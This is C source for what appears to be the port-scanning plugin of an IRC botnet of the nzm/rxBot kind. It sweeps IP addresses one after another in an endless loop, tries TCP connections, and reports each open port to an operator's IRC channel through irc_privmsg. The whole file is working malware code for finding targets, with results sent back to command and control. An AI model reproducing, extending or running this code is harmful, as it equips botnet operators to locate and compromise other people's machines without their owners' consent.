#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

#ifndef NO_SCAN

// checks ip for open port
DWORD WINAPI ScanConnectThread(LPVOID param)
{
	static char sendbuf[IRCLINE];

	SCAN scan = *((SCAN *)param);
	SCAN *scans = (SCAN *)param;
	scans->cgotinfo = TRUE;

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)scan.port);
	ssin.sin_addr = scan.addy;

	SOCKET sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sock != INVALID_SOCKET) {
		DWORD err = fconnect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		threads[scan.threadnum].sock = sock;
		if (err != SOCKET_ERROR) {
			sprintf(sendbuf,"nzm (portscan.plg) »»  IP: %s Port: %d is open.", finet_ntoa(scan.addy), scan.port);
			irc_privmsg(scan.sock, scan.chan, sendbuf, scan.notice);
			addlog(sendbuf);
		}
	}
	fclosesocket(sock);

	return 0;
}

// scan a range of IPs for an open port
DWORD WINAPI ScanThread(LPVOID param)
{
	DWORD id, host;
	HANDLE th;
	char str[128];

	SCAN scan = *((SCAN *)param);
	SCAN *scans = (SCAN *)param;
	scans->gotinfo = TRUE;

	while(1) {
		sprintf(str, "nzm (portscan.plg) »»  Scanning IP: %s, Port: %d.", finet_ntoa(scan.addy), scan.port);
		strncpy(threads[scan.threadnum].name, str, sizeof(threads[scan.threadnum].name)-1);
		if (th = CreateThread(NULL, 0, &ScanConnectThread, (LPVOID)&scan, 0, &id)) {
			while(scan.cgotinfo == FALSE)
				Sleep(50);
		}
		CloseHandle(th);
		scans->cgotinfo = FALSE;
		Sleep(scans->delay);
		memcpy(&host, &scan.addy, 4);
		host = fntohl(host);
		host += 1;
		host = fhtonl(host);
		memcpy(&scan.addy, &host, 4);
	}
	clearthread(scan.threadnum);

	return 0;
 }
#endif
